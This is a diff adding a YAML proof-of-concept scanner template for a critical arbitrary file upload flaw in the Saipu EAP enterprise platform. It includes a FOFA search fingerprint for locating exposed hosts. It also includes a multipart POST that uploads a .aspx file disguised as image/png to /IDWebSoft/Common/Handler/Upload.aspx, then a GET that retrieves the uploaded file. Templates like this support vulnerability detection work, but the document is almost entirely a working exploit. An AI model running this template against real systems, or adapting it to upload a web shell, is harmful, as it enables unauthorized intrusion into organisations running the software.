@@ -1,0 +1,41 @@
+id: poc-yaml-chinasap-eap-upload-anyfile-upload
+info:
+  name: 赛普EAP企业适配管理平台 Upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 赛普EAP企业适配管理平台
+  fofa: body="IDWebSoft/"
+variables:
+  t1: random_str(6)
+  t2: base64(t1)
+  dt1: datetime("2006")
+  dt2: datetime("01")
+requests:
+- method: POST
+  path: /IDWebSoft/Common/Handler/Upload.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------328367279028471380642525145085
+  data: '-----------------------------328367279028471380642525145085
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    -----------------------------328367279028471380642525145085--'
+  expression: 'status_code == 200 &&
+
+    contains(body,".aspx") &&
+
+    !contains(body,"<")
+
+    '
+  output:
+  - regex_match(body,"(?P<files>[0-9a-zA-Z-]{36}).aspx")
+- method: GET
+  path: /IDWebSoft/Accessary/{{.dt1}}/{{.dt2}}/{{.files}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
